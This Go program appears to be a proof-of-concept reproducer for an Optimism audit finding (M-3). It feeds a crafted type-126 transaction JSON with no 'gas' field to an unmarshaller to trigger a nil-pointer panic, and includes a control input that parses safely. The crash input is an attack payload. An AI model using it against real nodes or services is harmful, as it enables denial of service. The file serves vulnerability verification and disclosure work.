package main

import (
	"fmt"
	"os"
	"malformedjson/internal/types"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println("=== Optimism Audit M-3 Vulnerability Reproducer ===")
		fmt.Println("This tool reproduces the ACTUAL panic from the audit report")
		fmt.Println("")
		fmt.Println("Usage:")
		fmt.Println(`  ./malformedjson '{"type":126,"nonce":null,...}'`)
		fmt.Println("")
		fmt.Println("VULNERABLE case (will PANIC - missing gas field):")
		fmt.Printf("  %s '%s'\n", os.Args[0], `{"type":126,"nonce":null,"gasPrice":null,"maxPriorityFeePerGas":null,"maxFeePerGas":null,"value":1,"input":"0x616263646566","v":null,"r":null,"s":null,"to":null,"sourceHash":"0x0000000000000000000000000000000000000000000000000000000000000000","from":"0x0000000000000000000000000000000000000001","isSystemTx":false,"hash":"0xa4341f3db4363b7ca269a8538bd027b2f8784f84454ca917668642d5f6dffdf9"}`)
		fmt.Println("")
		fmt.Println("SAFE case (will succeed - with gas field):")
		fmt.Printf("  %s '%s'\n", os.Args[0], `{"type":126,"nonce":null,"gasPrice":null,"maxPriorityFeePerGas":null,"maxFeePerGas":null,"gas":"0x5208","value":1,"input":"0x616263646566","v":null,"r":null,"s":null,"to":null,"sourceHash":"0x0000000000000000000000000000000000000000000000000000000000000000","from":"0x0000000000000000000000000000000000000001","isSystemTx":false,"hash":"0xa4341f3db4363b7ca269a8538bd027b2f8784f84454ca917668642d5f6dffdf9"}`)
		fmt.Println("")
		fmt.Println("⚠️  WARNING: The vulnerable case will cause a real panic/crash!")
		os.Exit(1)
	}

	rawJSON := os.Args[1]
	fmt.Println("=== Optimism M-3 Vulnerability Reproduction ===")
	fmt.Println("[*] Input JSON:")
	fmt.Println(rawJSON)
	fmt.Println("")
	fmt.Println("[*] Attempting to unmarshal transaction...")
	fmt.Println("[*] If gas field is missing, this will panic with nil pointer dereference...")
	fmt.Println("")

	var tx types.Transaction
	
	// This will either succeed or panic with the exact same error as the audit report
	if err := tx.UnmarshalJSON([]byte(rawJSON)); err != nil {
		fmt.Println("[!] Unmarshal failed:", err)
		os.Exit(1)
	}

	fmt.Println("✅ [+] Unmarshal succeeded!")
	fmt.Println("✅ [+] Transaction parsed successfully - gas field was present")
	fmt.Println("")
	fmt.Println("   This JSON contains the required 'gas' field, so no panic occurred.")
	fmt.Println("   To trigger the panic, remove the 'gas' field from the JSON.")
}
